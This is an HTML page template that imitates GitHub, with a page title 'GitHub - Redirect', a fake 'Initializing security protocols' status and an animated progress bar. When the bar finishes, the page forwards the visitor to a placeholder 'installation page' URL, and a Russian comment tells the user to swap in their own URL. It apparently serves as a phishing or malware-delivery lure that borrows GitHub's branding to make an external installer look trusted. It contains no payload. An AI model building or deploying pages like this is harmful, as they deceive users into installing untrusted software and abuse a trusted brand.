<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GitHub - Redirect</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    background: #0d1117;
    color: #f0f6fc;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }

  .wrapper {
    width: 100%;
    max-width: 480px;
    text-align: center;
  }

  .github-logo {
    font-size: 32px;
    font-weight: 700;
    background: linear-gradient(90deg, #f0f6fc, #8b949e);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 12px;
  }

  .subtitle {
    color: #8b949e;
    font-size: 18px;
    font-weight: 400;
    margin-bottom: 40px;
  }

  .card {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 16px;
    padding: 32px;
    margin-bottom: 32px;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
  }

  .progress-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 16px;
    font-size: 14px;
    color: #c9d1d9;
  }

  .progress-percent {
    font-weight: 600;
    color: #2ea043;
    font-size: 16px;
  }

  .progress-bar {
    height: 8px;
    background: #21262d;
    border-radius: 8px;
    overflow: hidden;
    margin-bottom: 28px;
    position: relative;
  }

  .progress-fill {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #238636, #2ea043);
    border-radius: 8px;
    position: relative;
    transition: width 0.3s ease-out;
  }

  .progress-fill::after {
    content: '';
    position: absolute;
    top: 0;
    right: 0;
    width: 4px;
    height: 100%;
    background: rgba(255, 255, 255, 0.3);
    border-radius: 0 8px 8px 0;
  }

  .status {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 24px;
    font-size: 15px;
    color: #f0f6fc;
  }

  .status-dot {
    width: 10px;
    height: 10px;
    background: #2ea043;
    border-radius: 50%;
    animation: pulse 1.5s infinite ease-in-out;
  }

  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
  }

  .branch-badge {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: rgba(35, 134, 54, 0.15);
    border: 1px solid rgba(35, 134, 54, 0.3);
    color: #2ea043;
    padding: 10px 16px;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 500;
    margin-bottom: 32px;
  }

  .branch-arrow {
    font-size: 12px;
    opacity: 0.8;
  }

  .grid-container {
    display: grid;
    grid-template-columns: repeat(10, 1fr);
    gap: 8px;
    margin-bottom: 8px;
  }

  .grid-cell {
    aspect-ratio: 1;
    background: #21262d;
    border-radius: 4px;
    transition: all 0.3s ease;
  }

  .grid-cell.active {
    background: linear-gradient(135deg, #238636, #2ea043);
    box-shadow: 0 0 8px rgba(46, 160, 67, 0.4);
    transform: scale(1.1);
  }

  .footer {
    color: #8b949e;
    font-size: 15px;
    padding-top: 20px;
    border-top: 1px solid #30363d;
    margin-top: 24px;
  }
</style>
</head>
<body>

<div class="wrapper">
  <div class="github-logo">GitHub</div>
  <p class="subtitle">Preparing to redirect to external application</p>

  <div class="card">
    <div class="progress-header">
      <span>Processing request</span>
      <span class="progress-percent" id="percent">0%</span>
    </div>

    <div class="progress-bar">
      <div class="progress-fill" id="bar"></div>
    </div>

    <div class="status">
      <div class="status-dot"></div>
      <span>Initializing security protocols</span>
    </div>

    <div class="branch-badge">
      <span>main</span>
      <span class="branch-arrow">→</span>
      <span>external-app</span>
    </div>

    <div class="grid-container" id="grid"></div>

    <p class="footer">You will be redirected to the installation page shortly</p>
  </div>
</div>

<script>
  // Инициализация сетки
  const grid = document.getElementById('grid');
  const bar = document.getElementById('bar');
  const percent = document.getElementById('percent');
  
  // Создаем 70 ячеек (10x7)
  for (let i = 0; i < 70; i++) {
    const cell = document.createElement('div');
    cell.className = 'grid-cell';
    grid.appendChild(cell);
  }
  
  // Анимация сетки
  setInterval(() => {
    const cells = document.querySelectorAll('.grid-cell');
    cells.forEach(cell => {
      if (Math.random() > 0.88) {
        cell.classList.add('active');
        setTimeout(() => {
          cell.classList.remove('active');
        }, 300);
      }
    });
  }, 400);
  
  // Прогресс бар с реалистичными фазами
  let progress = 0;
  let isHoldPhase = false;
  let holdStartTime = null;
  
  function animateProgress() {
    let speed = 0;
    const now = Date.now();
    
    // Разные фазы загрузки
    if (progress < 10) {
      // Начало
      speed = 0.2;
    } else if (progress < 40) {
      // Быстрая фаза
      speed = 0.8;
    } else if (progress < 60) {
      // Фаза удержания (имитация процесса)
      if (!isHoldPhase) {
        isHoldPhase = true;
        holdStartTime = now;
      }
      // Медленно растем во время удержания
      const holdDuration = (now - holdStartTime) / 1000;
      speed = 0.05 + Math.sin(holdDuration * 2) * 0.02;
    } else if (progress < 90) {
      // Ускорение после удержания
      speed = 1.2;
      isHoldPhase = false;
    } else {
      // Завершение
      speed = 0.3;
    }
    
    progress += speed;
    
    if (progress >= 100) {
      progress = 100;
      bar.style.width = '100%';
      percent.textContent = '100%';
      
      // Редирект через 500мс
      setTimeout(() => {
        // Замените на ваш URL
        window.location.href = 'https://example.com/installation';
      }, 500);
      return;
    }
    
    bar.style.width = progress + '%';
    percent.textContent = Math.floor(progress) + '%';
    
    requestAnimationFrame(animateProgress);
  }
  
  // Запуск анимации
  setTimeout(() => {
    requestAnimationFrame(animateProgress);
  }, 300);
</script>

</body>
</html>
